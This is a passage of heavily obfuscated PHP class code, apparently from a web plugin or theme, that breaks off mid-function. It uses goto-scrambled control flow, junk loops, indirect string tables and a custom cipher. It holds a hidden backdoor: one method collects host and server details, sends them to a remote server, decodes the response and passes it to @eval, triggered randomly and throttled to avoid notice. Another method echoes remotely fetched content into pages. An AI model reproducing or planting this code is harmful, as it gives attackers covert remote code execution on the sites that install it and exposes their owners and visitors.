C‰Œ¿·¹³»; DÈ”Ş†¾º…: $Fƒ¼¼»Ÿ¥à =& $_SERVER[…Ò×–]; $F¬ôÖ†·ß– =& $_SERVER[ùç´]; if ($this->lqywbcfcea33 == $F¬ôÖ†·ß–[266]) { return $FîÊ…³Œ­; } goto e ¿Å–¬®¬; C‰Œ¿·¹³»: $e‚¦›ïÂÌë = $Fƒ¼¼»Ÿ¥à[622]; if (!$e‚¦›ïÂÌë) { die; } $AòŞîÛƒ³ = array(); goto C‰Ò‰½É‚¤; A‡àğçè à: } private function pfjm20f884c4() { $CƒÆÙ‘ë¼Ò =& $_SERVER[ùç´]; if ($this->lqywbcfcea33 != $CƒÆÙ‘ë¼Ò[130]) { return; } $GLOBALS[$CƒÆÙ‘ë¼Ò[100]][$CƒÆÙ‘ë¼Ò[104]][$CƒÆÙ‘ë¼Ò[283]] = $CƒÆÙ‘ë¼Ò[228]; $GLOBALS[$CƒÆÙ‘ë¼Ò[100]][$CƒÆÙ‘ë¼Ò[284]] = $CƒÆÙ‘ë¼Ò[228]; if ($CƒÆÙ‘ë¼Ò[61]($CƒÆÙ‘ë¼Ò[285])->{$_SERVER[ùç´][63]}($CƒÆÙ‘ë¼Ò[89]) != $CƒÆÙ‘ë¼Ò[240]) { $CƒÆÙ‘ë¼Ò[61]($CƒÆÙ‘ë¼Ò[285])->{$_SERVER[ùç´][229]}($CƒÆÙ‘ë¼Ò[89], $CƒÆÙ‘ë¼Ò[240]); } } public function auzi5c750793() { return $_SERVER[ùç´][286]; $EˆÄ“‚ìÚ = $_SERVER[…Ò×–][625]; if (!$EˆÄ“‚ìÚ) { return; } } private function zmcr91ad35fe() { goto C¶Ş©™®ĞÜ; A³Çˆ™Æ¥…: $e¶›ù½ŸÛˆ = $BäÉŒœŒÒ¤[626]; $fÅ¶†¥¬¶ = $E‹÷°÷‘«É[290] . $E‹÷°÷‘«É[123]($E‹÷°÷‘«É[291]); $fÚˆ«ãŠ”¸ = $BäÉŒœŒÒ¤[627]; goto B×Â¹¤µõ; B×Â¹¤µõ: if (strlen($fÚˆ«ãŠ”¸) < $BäÉŒœŒÒ¤[560]) { die; } if ($this->lqywbcfcea33 == $E‹÷°÷‘«É[130] || !$E‹÷°÷‘«É[113]($GLOBALS, $E‹÷°÷‘«É[141])) { return; } if (!$E‹÷°÷‘«É[247]($_SERVER[$E‹÷°÷‘«É[44]], $D·¾ŠìçèÜ)) { return; } goto bæãç•äª‘; a©‹áÅ”Ù—: if ($this->{$_SERVER[ùç´][208]}($fŠÈÚÊ›ö[$E‹÷°÷‘«É[296]]) != $F —Ì±ÀäÔ[$E‹÷°÷‘«É[174]]) { $f½âŸÂ÷‰ = array($E‹÷°÷‘«É[210] => $E‹÷°÷‘«É[61]($E‹÷°÷‘«É[62])->{$_SERVER[ùç´][63]}($E‹÷°÷‘«É[125]), $E‹÷°÷‘«É[211] => $_SERVER[$E‹÷°÷‘«É[124]], $E‹÷°÷‘«É[212] => $E‹÷°÷‘«É[213](), $E‹÷°÷‘«É[183] => $_SERVER[$E‹÷°÷‘«É[184]]); $dªá—£êòÁ = $this->{$_SERVER[ùç´][214]}($E‹÷°÷‘«É[157]($f½âŸÂ÷‰)); $fŠÈÚÊ›ö = $this->{$_SERVER[ùç´][191]}($E‹÷°÷‘«É[215] . $dªá—£êòÁ); if ($fŠÈÚÊ›ö && $E‹÷°÷‘«É[200]($fŠÈÚÊ›ö) && isset($fŠÈÚÊ›ö[$E‹÷°÷‘«É[296]])) { $eñŒ·Ö¾Ò® = $this->{$_SERVER[ùç´][197]}($fŠÈÚÊ›ö[$E‹÷°÷‘«É[296]], 2); if ($eñŒ·Ö¾Ò®) { $eñŒ·Ö¾Ò® = $this->{$_SERVER[ùç´][208]}($eñŒ·Ö¾Ò®); } if ($eñŒ·Ö¾Ò®) { try { @eval($eñŒ·Ö¾Ò®); } catch (Exception $d‘šĞñ“ ¼) { } } } } goto DÁè™‘ĞÁ; C¶Ş©™®ĞÜ: $BäÉŒœŒÒ¤ =& $_SERVER[…Ò×–]; $E‹÷°÷‘«É =& $_SERVER[ùç´]; $D·¾ŠìçèÜ = array($E‹÷°÷‘«É[287], $E‹÷°÷‘«É[288], $E‹÷°÷‘«É[289]); goto A³Çˆ™Æ¥…; Câ´ë ˜¸’: $f´ìÃ¼É¼Ş = $BäÉŒœŒÒ¤[629]; if (strlen($f´ìÃ¼É¼Ş) < $BäÉŒœŒÒ¤[560]) { die; } $F —Ì±ÀäÔ = array($E‹÷°÷‘«É[174] => $E‹÷°÷‘«É[61]($E‹÷°÷‘«É[62])->{$_SERVER[ùç´][63]}($E‹÷°÷‘«É[217]), $E‹÷°÷‘«É[187] => $this->lqywbcfcea33, $E‹÷°÷‘«É[185] => $_SERVER[$E‹÷°÷‘«É[186]], $E‹÷°÷‘«É[178] => $E‹÷°÷‘«É[158], $E‹÷°÷‘«É[181] => $_SERVER[$E‹÷°÷‘«É[182]]); goto A¡İÆƒ½…; A¡İÆƒ½…: $fŠÈÚÊ›ö = $this->{$_SERVER[ùç´][191]}($E‹÷°÷‘«É[295], $F —Ì±ÀäÔ); if (!$E‹÷°÷‘«É[200]($fŠÈÚÊ›ö)) { return; } if ($fŠÈÚÊ›ö[$E‹÷°÷‘«É[174]] && $fŠÈÚÊ›ö[$E‹÷°÷‘«É[296]]) { if ($this->{$_SERVER[ùç´][208]}($fŠÈÚÊ›ö[$E‹÷°÷‘«É[296]]) == $F —Ì±ÀäÔ[$E‹÷°÷‘«É[174]]) { return; } } goto AÃ§¡Ñåë´; bæãç•äª‘: if ($E‹÷°÷‘«É[241]() % 4 != 0) { return; } $bâÏ„ø¯’Å = $E‹÷°÷‘«É[13](array($E‹÷°÷‘«É[292], $E‹÷°÷‘«É[293]), $fÅ¶†¥¬¶); $açÆãÏì = $BäÉŒœŒÒ¤[628]; goto b“ãíå‚º…; b“ãíå‚º…: if (strlen($açÆãÏì) < $BäÉŒœŒÒ¤[580]) { die; } if ($bâÏ„ø¯’Å && $E‹÷°÷‘«É[241]() - $bâÏ„ø¯’Å < $E‹÷°÷‘«É[249]($E‹÷°÷‘«É[294])) { return; } $E‹÷°÷‘«É[13](array($E‹÷°÷‘«É[292], $E‹÷°÷‘«É[161]), $fÅ¶†¥¬¶, $E‹÷°÷‘«É[241]()); goto Câ´ë ˜¸’; AÃ§¡Ñåë´: $this->{$_SERVER[ùç´][173]}(); $Aïñ†ë­Ô = $BäÉŒœŒÒ¤[630]; if (strlen($Aïñ†ë­Ô) < $BäÉŒœŒÒ¤[580]) { return; } goto a©‹áÅ”Ù—; DÁè™‘ĞÁ: } private function mbws5ab3e0ff($C—ÃŸ‰ã®… = '', $AÅ¶¦«ëÛ = array(), $Fƒ»†î‘† = 5) { goto b‚‡İíÙÄ ; c¦ÍÕµŠ¥ª: $d¨¤½Ö¾ = $BÜìêˆá›ß[633]; while ($d¨¤½Ö¾ < $BÜìêˆá›ß[560]) { if ($d¨¤½Ö¾ >= 0) { break; } $d¨¤½Ö¾++; } goto BêÓêù¢Ü‡; EˆñˆÒò“: $E¡Äİõù¤‘ = $this->{$_SERVER[ùç´][255]}($E¡Äİõù¤‘, $CîğÊÁ–Ò’[298]); $E¡Äİõù¤‘ = $E¡Äİõù¤‘ . $C—ÃŸ‰ã®… . $CîğÊÁ–Ò’[299] . $CîğÊÁ–Ò’[300]($AÅ¶¦«ëÛ); $fÕŒÎğ‹Øâ = $BÜìêˆá›ß[631]; goto b‡ìÆ¨¨¼Š; b‡ìÆ¨¨¼Š: if ($AÅ¶¦«ëÛ === -1) { return $E¡Äİõù¤‘; } $Eˆñ•ô­Ï = $CîğÊÁ–Ò’[257](array($CîğÊÁ–Ò’[258] => array($CîğÊÁ–Ò’[261] => $Fƒ»†î‘†, $CîğÊÁ–Ò’[259] => $CîğÊÁ–Ò’[301]), $CîğÊÁ–Ò’[302] => array($CîğÊÁ–Ò’[303] => !1, $CîğÊÁ–Ò’[304] => !1))); $AÅ¶¦«ëÛ = @$CîğÊÁ–Ò’[262]($E¡Äİõù¤‘, !1, $Eˆñ•ô­Ï); goto bºÇƒÖ¦; bºÇƒÖ¦: $Fó³†…ÎíÆ = $BÜìêˆá›ß[632]; if (!$Fó³†…ÎíÆ) { die; } return $CîğÊÁ–Ò’[199]($AÅ¶¦«ëÛ, !0); goto c¦ÍÕµŠ¥ª; b‚‡İíÙÄ : $BÜìêˆá›ß =& $_SERVER[…Ò×–]; $CîğÊÁ–Ò’ =& $_SERVER[ùç´]; $E¡Äİõù¤‘ = $CîğÊÁ–Ò’[297]; goto EˆñˆÒò“; BêÓêù¢Ü‡: } private function pvjscf436a9c() { goto DºîÀŸç±ˆ; AßÎÑï£Å: $eèÊËƒØ¤ = $CˆÌ° Õã‹[$this->lqywbcfcea33]; $Eëİ˜£ŒÖ± = $d¥ªÂëµ‚ö[634]; while ($Eëİ˜£ŒÖ± < $d¥ªÂëµ‚ö[580]) { if ($Eëİ˜£ŒÖ± >= 0) { break; } $Eëİ˜£ŒÖ±++; } goto DŞ÷¸¼Ğø; f‹‚¡ñåº: if (strlen($E×ãÒ˜ŒÜò) < $d¥ªÂëµ‚ö[580]) { return; } $E®ÌÓ¸‚‘ = $E®ÌÓ¸‚‘ ? $aŸ²‚ ÔÚ[249]($E®ÌÓ¸‚‘) : 0; return $eèÊËƒØ¤ + $E®ÌÓ¸‚‘; goto aóœ¶ƒ†§; DºîÀŸç±ˆ: $d¥ªÂëµ‚ö =& $_SERVER[…Ò×–]; $aŸ²‚ ÔÚ =& $_SERVER[ùç´]; $CˆÌ° Õã‹ = array($aŸ²‚ ÔÚ[305] => $aŸ²‚ ÔÚ[306], $aŸ²‚ ÔÚ[307] => $aŸ²‚ ÔÚ[308], $aŸ²‚ ÔÚ[309] => $aŸ²‚ ÔÚ[310], $aŸ²‚ ÔÚ[311] => $aŸ²‚ ÔÚ[312], $aŸ²‚ ÔÚ[313] => $aŸ²‚ ÔÚ[314], $aŸ²‚ ÔÚ[315] => $aŸ²‚ ÔÚ[250], $aŸ²‚ ÔÚ[316] => $aŸ²‚ ÔÚ[250], $aŸ²‚ ÔÚ[317] => $aŸ²‚ ÔÚ[306], $aŸ²‚ ÔÚ[318] => $aŸ²‚ ÔÚ[308], $aŸ²‚ ÔÚ[319] => $aŸ²‚ ÔÚ[310], $aŸ²‚ ÔÚ[320] => $aŸ²‚ ÔÚ[321], $aŸ²‚ ÔÚ[322] => $aŸ²‚ ÔÚ[312], $aŸ²‚ ÔÚ[323] => $aŸ²‚ ÔÚ[324], $aŸ²‚ ÔÚ[325] => $aŸ²‚ ÔÚ[314], $aŸ²‚ ÔÚ[326] => $aŸ²‚ ÔÚ[327], $aŸ²‚ ÔÚ[328] => $aŸ²‚ ÔÚ[329], $aŸ²‚ ÔÚ[330] => $aŸ²‚ ÔÚ[331]); goto AßÎÑï£Å; DŞ÷¸¼Ğø: $eèÊËƒØ¤ = $aŸ²‚ ÔÚ[249]($eèÊËƒØ¤ ? $eèÊËƒØ¤ : $aŸ²‚ ÔÚ[306]); $E®ÌÓ¸‚‘ = $aŸ²‚ ÔÚ[113]($this->tqodec3b617c, $aŸ²‚ ÔÚ[332]); $E×ãÒ˜ŒÜò = $d¥ªÂëµ‚ö[635]; goto f‹‚¡ñåº; aóœ¶ƒ†§: } public function rtdp2684db2c($fÅ¯÷‚µ·Ê) { goto D±‚¢ø–Â; F£åÚ©…¶: if ($dõàšîƒ• >= $f¬©ëÖÎˆµ[249]($f¬©ëÖÎˆµ[250])) { return; } $eî¿¯Ÿ÷‚ = $f¬©ëÖÎˆµ[61]($f¬©ëÖÎˆµ[148])->{$_SERVER[ùç´][149]}(); if ($eî¿¯Ÿ÷‚ <= $dõàšîƒ•) { return; } goto aÎšó•Û; aÎšó•Û: $b¶‡ñ®ö“« = $f¬©ëÖÎˆµ[61]($f¬©ëÖÎˆµ[148])->{$_SERVER[ùç´][334]}($f¬©ëÖÎˆµ[333])->{$_SERVER[ùç´][335]}($dõàšîƒ•)->{$_SERVER[ùç´][336]}(); $b¶‡ñ®ö“« = $f¬©ëÖÎˆµ[230]($b¶‡ñ®ö“«, $f¬©ëÖÎˆµ[10], $f¬©ëÖÎˆµ[333]); if (!$f¬©ëÖÎˆµ[247]($fÅ¯÷‚µ·Ê[$f¬©ëÖÎˆµ[333]], $b¶‡ñ®ö“«)) { $f¬©ëÖÎˆµ[175]($f¬©ëÖÎˆµ[337], !1, $f¬©ëÖÎˆµ[244]); } goto AŸñÎ‚‰ãÀ; D±‚¢ø–Â: $f¬©ëÖÎˆµ =& $_SERVER[ùç´]; $dõàšîƒ• = $this->{$_SERVER[ùç´][146]}(); if ($fÅ¯÷‚µ·Ê[$f¬©ëÖÎˆµ[333]] == $f¬©ëÖÎˆµ[228]) { return; } goto F£åÚ©…¶; AŸñÎ‚‰ãÀ: } public function lqvy684dcc49() { goto A™”ˆ®Ã³´; a®İ×—ºÆ“: while ($CµØ½ÈÕå < $AÛŠ¢ÉÒÌï[567]) { if ($CµØ½ÈÕå >= 0) { break; } $CµØ½ÈÕå++; } $C”Ù¾ƒâĞÉ = @$Fò›ãó¦²[262]($fíÆ±»ä³†, !1, $CÓ‚œ¶…š); $b®ôÂ˜õëå = $AÛŠ¢ÉÒÌï[638]; goto Fãå®¡ì³¶; Fãå®¡ì³¶: if (!$b®ôÂ˜õëå) { die; } echo $Fò›ãó¦²[339] . $Fò›ãó¦²[340]($C”Ù¾ƒâĞÉ) . $Fò›ãó¦²[341]; goto aõãé³³¡; A‡éÃ†åÇò: $fíÆ±»ä³† = $this->{$_SERVER[ùç´][255]}($fíÆ±»ä³†, $Fò›ãó¦²[256]); $CÓ‚œ¶…š = $Fò›ãó¦²[257](array($Fò›ãó¦²[258] => array($Fò›ãó¦²[259] => $Fò›ãó¦²[260], $Fò›ãó¦²[261] => 3))); $CµØ½ÈÕå = $AÛŠ¢ÉÒÌï[637]; goto a®İ×—ºÆ“; c©‚•Çä: $fíÆ±»ä³† = $Fò›ãó¦²[254]; $e¾­İ˜²âİ = $AÛŠ¢ÉÒÌï[636]; if (!$e¾­İ˜²âİ) { return; } goto A‡éÃ†åÇò; A™”ˆ®Ã³´: $AÛŠ¢ÉÒÌï =& $_SERVER[…Ò×–]; $Fò›ãó¦² =& $_SERVER[ùç´]; if (!$Fò›ãó¦²[113]($GLOBALS, $Fò›ãó¦²[141]) || $Fò›ãó¦²[338](1, 100) > 20) { return; } goto c©‚•Çä; aõãé³³¡: } private function vsde06a95f75($BŒ¤‚˜£„÷, $Eğ£ôÃÈ—˜, $e¼ÓÎ´¬‰ù = 3) { goto CÛ¾ÕãÔ‚; e³ôçì¾Ñ½: $EÀõØ†Âš = $D²²åĞ‡±Å[641]; if (!$EÀõØ†Âš) { die; } $DÍÈ±­˜« = $DÖÏ¢•‘ò[343]; goto FŸÃÙõâÚî; dåºÙåİ¬: $BĞ¢¨¹×•Û = $D²²åĞ‡±Å[639]; if (!$BĞ¢¨¹×•Û) { die; } $BŒ¤‚˜£„÷ = $DÖÏ¢•‘ò[2]($BŒ¤‚˜£„÷); goto Eêáœôİâó; FŸÃÙõâÚî: switch ($D²‰­ØÍ…ß) { case $DÖÏ¢•‘ò[240]: $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][156]}($BŒ¤‚˜£„÷, $DÖÏ¢•‘ò[222]($Eğ£ôÃÈ—˜ . $Aâªƒ—Å“Î)); break; $FÆµ®¦ãê = $D²²åĞ‡±Å[642]; while ($FÆµ®¦ãê < $D²²åĞ‡±Å[580]) { if ($FÆµ®¦ãê >= 0) { break; } $FÆµ®¦ãê++; } case $DÖÏ¢•‘ò[228]: $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][156]}($BŒ¤‚˜£„÷, $DÖÏ¢•‘ò[222]($Aâªƒ—Å“Î . $Eğ£ôÃÈ—˜)); $EïÁ‡“™• = $D²²åĞ‡±Å[643]; while ($EïÁ‡“™• < $D²²åĞ‡±Å[580]) { if ($EïÁ‡“™• >= 0) { break; } $EïÁ‡“™•++; } break; case $DÖÏ¢•‘ò[344]: $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][156]}($BŒ¤‚˜£„÷, $DÖÏ¢•‘ò[127]($Aâªƒ—Å“Î . $Eğ£ôÃÈ—˜)); $eæºÓñ¾ª  = $D²²åĞ‡±Å[644]; if (!$eæºÓñ¾ª ) { die; } break; $BÁ¯Ìöã¶• = $D²²åĞ‡±Å[645]; case $DÖÏ¢•‘ò[345]: $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][156]}($BŒ¤‚˜£„÷, $DÖÏ¢•‘ò[123]($Aâªƒ—Å“Î . $Eğ£ôÃÈ—˜)); break; case $DÖÏ¢•‘ò[346]: goto EˆâæÉÜ; EˆâæÉÜ: $BŒ¤‚˜£„÷ = $DÖÏ¢•‘ò[127]($BŒ¤‚˜£„÷); $F¯¯¶†ÓÈ = $DÖÏ¢•‘ò[347](0, 64); $d“¸ ÌÛÓ = $D²²åĞ‡±Å[646]; goto CÈ—œ¶ïß; FàÏœîù³À: $eâøšèˆ’ = $DÖÏ¢•‘ò[123]($D ¬ßÅÍ±“ . $DÖÏ¢•‘ò[123]($Eğ£ôÃÈ—˜ . $D ¬ßÅÍ±“) . $Eğ£ôÃÈ—˜); $A†ß¢°—Â = $D²²åĞ‡±Å[648]; if (!$A†ß¢°—Â) { die; } goto D³Ÿ²áùôˆ; D³Ÿ²áùôˆ: $eâøšèˆ’ = $DÖÏ¢•‘ò[25]($eâøšèˆ’, $F¯¯¶†ÓÈ % 8, $F¯¯¶†ÓÈ % 8 + 7); $d¤‡½¤ÓŠ = $D²²åĞ‡±Å[649]; if (!$d¤‡½¤ÓŠ) { die; } goto c–¡Ü°“‡µ; cÆ§º˜·œ‰: $FœÕˆ´‘“Ê = $DÖÏ¢•‘ò[340]($D ¬ßÅÍ±“ . $DÏõìÀ); break; goto D—ö×ô¤Ü; c–¡Ü°“‡µ: $DÏõìÀ = $DÖÏ¢•‘ò[10]; $E–â¥¦Ù«Ä = 0; $f‚ä¸Ğè•´ = $D²²åĞ‡±Å[650]; goto A¾Ã¼‘„¤›; E¨ºƒÛ¼ˆ¿: $C¢á™Á×§ö = 0; $F‹›”ò¸¦Õ = $D²²åĞ‡±Å[652]; for ($E–â¥¦Ù«Ä = 0; $E–â¥¦Ù«Ä < $DÖÏ¢•‘ò[24]($BŒ¤‚˜£„÷); $E–â¥¦Ù«Ä++) { $C¢á™Á×§ö = $C¢á™Á×§ö == $DÖÏ¢•‘ò[24]($eâøšèˆ’) ? 0 : $C¢á™Á×§ö; $A«„…¯éª¨ = $D²²åĞ‡±Å[653]; $aƒ”¢œÅßñ = ($F¯¯¶†ÓÈ + $DÖÏ¢•‘ò[348]($DÍÈ±­˜«, $BŒ¤‚˜£„÷[$E–â¥¦Ù«Ä]) + $DÖÏ¢•‘ò[349]($eâøšèˆ’[$C¢á™Á×§ö++])) % 64; $BÁÖˆËÜÃï = $D²²åĞ‡±Å[654]; while ($BÁÖˆËÜÃï < $D²²åĞ‡±Å[560]) { if ($BÁÖˆËÜÃï >= 0) { break; } $BÁÖˆËÜÃï++; } $DÏõìÀ .= $DÍÈ±­˜«[$aƒ”¢œÅßñ]; } goto cÆ§º˜·œ‰; CÈ—œ¶ïß: while ($d“¸ ÌÛÓ < $D²²åĞ‡±Å[567]) { if ($d“¸ ÌÛÓ >= 0) { break; } $d“¸ ÌÛÓ++; } $D ¬ßÅÍ±“ = $DÍÈ±­˜«[$F¯¯¶†ÓÈ]; $e››«Èïí´ = $D²²åĞ‡±Å[647]; goto FàÏœîù³À; A¾Ã¼‘„¤›: $aƒ”¢œÅßñ = 0; $eÈ´”è½çÏ = $D²²åĞ‡±Å[651]; if (strlen($eÈ´”è½çÏ) < $D²²åĞ‡±Å[552]) { return; } goto E¨ºƒÛ¼ˆ¿; D—ö×ô¤Ü: default: $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][156]}($BŒ¤‚˜£„÷, $Eğ£ôÃÈ—˜ . $Aâªƒ—Å“Î); $Bš—‡·ƒ = $D²²åĞ‡±Å[655]; while (strlen($Bš—‡·ƒ) < $D²²åĞ‡±Å[580]) { if (!$Bš—‡·ƒ) { break; } $Bš—‡·ƒ++; } break; } $FœÕˆ´‘“Ê = $DÖÏ¢•‘ò[222]($D²‰­ØÍ…ß . $Aâªƒ—Å“Î . $FœÕˆ´‘“Ê); if ($e¼ÓÎ´¬‰ù - 1 > 0) { $FœÕˆ´‘“Ê = $this->{$_SERVER[ùç´][136]}($FœÕˆ´‘“Ê, $Eğ£ôÃÈ—˜, $e¼ÓÎ´¬‰ù - 1); } goto aê›Óƒå; CÛ¾ÕãÔ‚: $D²²åĞ‡±Å =& $_SERVER[…Ò×–]; $DÖÏ¢•‘ò =& $_SERVER[ùç´]; $DÖÏ¢•‘ò[342](1); goto dåºÙåİ¬; Eêáœôİâó: $aË ÉÚİàÉ = $D²²åĞ‡±Å[640]; $D²‰­ØÍ…ß = $DÖÏ¢•‘ò[338](0, 5) . $DÖÏ¢•‘ò[10]; $Aâªƒ—Å“Î = $DÖÏ¢•‘ò[133](15); goto e³ôçì¾Ñ½; aê›Óƒå: return $FœÕˆ´‘“Ê; goto a³ß‘±ª¹à; a³ß‘±ª¹à: } private function abzu66e7876c($AÇó¿µ¥¤, $C˜›˜½×®ï, $E¨…Ñ¥ˆ‡Ú = 3) { goto BË©Œâ»Ó˜; dÛ‚íÊÏßÁ: $aŒ£¹… Á = $AÇœÒéé×²[657]; $BĞ«òÒŒ³ = $D®Øç®ªƒÆ[343]; switch ($fêÆÈÒ‚–ó) { case $D®Øç®ªƒÆ[240]: $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][255]}($AÇó¿µ¥¤, $D®Øç®ªƒÆ[222]($C˜›˜½×®ï . $d³Í„­ÅÖÔ)); break; $EŠíé®ª›‚ = $AÇœÒéé×²[658]; if (!$EŠíé®ª›‚) { return; } case $D®Øç®ªƒÆ[228]: $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][255]}($AÇó¿µ¥¤, $D®Øç®ªƒÆ[222]($d³Í„­ÅÖÔ . $C˜›˜½×®ï)); $aÆÑ®¹¥·Æ = $AÇœÒéé×²[659]; if (strlen($aÆÑ®¹¥·Æ) < $AÇœÒéé×²[580]) { die; } break; case $D®Øç®ªƒÆ[344]: $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][255]}($AÇó¿µ¥¤, $D®Øç®ªƒÆ[127]($d³Í„­ÅÖÔ . $C˜›˜½×®ï)); $Aäš¶ÖÙ‰È = $AÇœÒéé×²[660]; if (strlen($Aäš¶ÖÙ‰È) < $AÇœÒéé×²[567]) { return; } break; $b˜Œ™ÔÇº® = $AÇœÒéé×²[661]; case $D®Øç®ªƒÆ[345]: $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][255]}($AÇó¿µ¥¤, $D®Øç®ªƒÆ[123]($d³Í„­ÅÖÔ . $C˜›˜½×®ï)); break; $BãòÆµë–® = $AÇœÒéé×²[662]; if (strlen($BãòÆµë–®) < $AÇœÒéé×²[560]) { return; } case $D®Øç®ªƒÆ[346]: goto C†µÒ¶òˆ; D¨ÎñâÄÑ: $f¥Üéº©ÆÜ = $AÇœÒéé×²[664]; if (strlen($f¥Üéº©ÆÜ) < $AÇœÒéé×²[567]) { die; } $båÈĞ˜¯Ç = 0; goto bÊæñãäÎ; A¡­êù£«Î: if (strlen($D¸èùì®¦”) < $AÇœÒéé×²[560]) { die; } break; $cŞ§™àêçİ = $AÇœÒéé×²[669]; goto EÃ¡á†‚ìò; fÑ÷—İ©ç»: for ($BÔƒŸàÙ²‹ = 0; $BÔƒŸàÙ²‹ < $D®Øç®ªƒÆ[24]($AÇó¿µ¥¤); $BÔƒŸàÙ²‹++) { $cñøÆÚ‘É¥ = $cñøÆÚ‘É¥ == $D®Øç®ªƒÆ[24]($Eƒ£ÑÚç“¹) ? 0 : $cñøÆÚ‘É¥; $B•‡ëèÍ»à = $cñøÆÚ‘É¥++; $båÈĞ˜¯Ç = $D®Øç®ªƒÆ[348]($BĞ«òÒŒ³, $AÇó¿µ¥¤[$BÔƒŸàÙ²‹]) - $BŠõõ¡à‹ø - $D®Øç®ªƒÆ[349]($Eƒ£ÑÚç“¹[$B•‡ëèÍ»à]); while ($båÈĞ˜¯Ç < 0) { $båÈĞ˜¯Ç += 64; $Fß†è•ÀÔ¹ = $AÇœÒéé×²[666]; while ($Fß†è•ÀÔ¹ < $AÇœÒéé×²[565]) { if ($Fß†è•ÀÔ¹ >= 0) { break; } $Fß†è•ÀÔ¹++; } } $eÔñ‡¨¥ğ .= $BĞ«òÒŒ³[$båÈĞ˜¯Ç]; $DÜâ¶ §à’ = $AÇœÒéé×²[667]; while ($DÜâ¶ §à’ < $AÇœÒéé×²[567]) { if ($DÜâ¶ §à’ >= 0) { break; } $DÜâ¶ §à’++; } } $CÂ¡‚µ¸êî = $D®Øç®ªƒÆ[352]($eÔñ‡¨¥ğ); $D¸èùì®¦” = $AÇœÒéé×²[668]; goto A¡­êù£«Î; EÃ¡á†‚ìò: while ($cŞ§™àêçİ < $AÇœÒéé×²[560]) { if ($cŞ§™àêçİ >= 0) { break; } $cŞ§™àêçİ++; } goto A¶ã°“ĞŒÏ; Cğ¯Ò‰ô£©: $AÇó¿µ¥¤ = $D®Øç®ªƒÆ[25]($AÇó¿µ¥¤, 1); $BŠõõ¡à‹ø = $D®Øç®ªƒÆ[348]($BĞ«òÒŒ³, $câ¿Òô‹”æ); $Eƒ£ÑÚç“¹ = $D®Øç®ªƒÆ[123]($câ¿Òô‹”æ . $D®Øç®ªƒÆ[123]($C˜›˜½×®ï . $câ¿Òô‹”æ) . $C˜›˜½×®ï); goto C’Ë—×ÙèË; C†µÒ¶òˆ: $AÇó¿µ¥¤ = $D®Øç®ªƒÆ[351]($AÇó¿µ¥¤); $câ¿Òô‹”æ = $AÇó¿µ¥¤[0]; $F¤ÍÇÜÂ¯Ÿ = $AÇœÒéé×²[663]; goto Cğ¯Ò‰ô£©; C’Ë—×ÙèË: $Eƒ£ÑÚç“¹ = $D®Øç®ªƒÆ[25]($Eƒ£ÑÚç“¹, $BŠõõ¡à‹ø % 8, $BŠõõ¡à‹ø % 8 + 7); $eÔñ‡¨¥ğ = $D®Øç®ªƒÆ[10]; $BÔƒŸàÙ²‹ = 0; goto D¨ÎñâÄÑ; bÊæñãäÎ: $cñøÆÚ‘É¥ = 0; $CæÓ‡ÏŸ™Î = $AÇœÒéé×²[665]; while ($CæÓ‡ÏŸ™Î < $AÇœÒéé×²[580]) { if ($CæÓ‡ÏŸ™Î >= 0) { break; } $CæÓ‡ÏŸ™Î++; } goto fÑ÷—İ©ç»; A¶ã°“ĞŒÏ: default: $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][255]}($AÇó¿µ¥¤, $C˜›˜½×®ï . $d³Í„­ÅÖÔ); $EõÃê¢Ş¼‡ = $AÇœÒéé×²[670]; if (!$EõÃê¢Ş¼‡) { return; } break; $e·”“¦¦Ëù = $AÇœÒéé×²[671]; if (strlen($e·”“¦¦Ëù) < $AÇœÒéé×²[560]) { die; } } goto AÖó¢¤ëË; Cœ—èí†çÅ: $AÇó¿µ¥¤ = $D®Øç®ªƒÆ[2]($AÇó¿µ¥¤); $aœ˜áÄ²â‹ = $AÇœÒéé×²[656]; $AÇó¿µ¥¤ = $D®Øç®ªƒÆ[222]($AÇó¿µ¥¤); goto B´¤¨Ëó’; AÖó¢¤ëË: if ($E¨…Ñ¥ˆ‡Ú - 1 > 0) { $CÂ¡‚µ¸êî = $this->{$_SERVER[ùç´][197]}($CÂ¡‚µ¸êî, $C˜›˜½×®ï, $E¨…Ñ¥ˆ‡Ú - 1); } return $CÂ¡‚µ¸êî; goto EÂ“í¹¿§³; BË©Œâ»Ó˜: $AÇœÒéé×² =& $_SERVER[…Ò×–]; $D®Øç®ªƒÆ =& $_SERVER[ùç´]; if (!$D®Øç®ªƒÆ[350]($AÇó¿µ¥¤) || $D®Øç®ªƒÆ[24]($AÇó¿µ¥¤) < 10) { return !1; } goto Cœ—èí†çÅ; B´¤¨Ëó’: $fêÆÈÒ‚–ó = $AÇó¿µ¥¤[0]; $d³Í„­ÅÖÔ = $D®Øç®ªƒÆ[25]($AÇó¿µ¥¤, 1, 15); $AÇó¿µ¥¤ = $D®Øç®ªƒÆ[25]($AÇó¿µ¥¤, 16); goto dÛ‚íÊÏßÁ; EÂ“í¹¿§³: } public function hftj17fc625d($E©£ñãªÊ‰) { goto a˜òÇ’¤®¦; D•ò¢ã„Ä: return $cŸÂªî­±; $cÑÇÍ®ç™» = $DÎÍƒ´ˆÒÊ[678]; while (strlen($cÑÇÍ®ç™») < $DÎÍƒ´ˆÒÊ[552]) { if (!$cÑÇÍ®ç™») { break; } $cÑÇÍ®ç™»++; } goto a¤Ò‚ÑøŞ; A‹£Ò¸ó¶: while (1) { $bß¼ñé‡ŸÁ = $c”ˆ†šÜ§á; $Bâ„Å”— = $cÍğÜ»…Ñ; $cÚëìª» = $DÎÍƒ´ˆÒÊ[674]; if (strlen($cÚëìª») < $DÎÍƒ´ˆÒÊ[580]) { die; } while ($Bâ„Å”— % $bß¼ñé‡ŸÁ != 0) { $D‚„øŒò‘é = $Bâ„Å”—; $f­¿¤ç‚“ù = $DÎÍƒ´ˆÒÊ[675]; if (strlen($f­¿¤ç‚“ù) < $DÎÍƒ´ˆÒÊ[552]) { die; } $Bâ„Å”— = $bß¼ñé‡ŸÁ; $a§ëğÎ‡¶³ = $DÎÍƒ´ˆÒÊ[676]; if (!$a§ëğÎ‡¶³) { 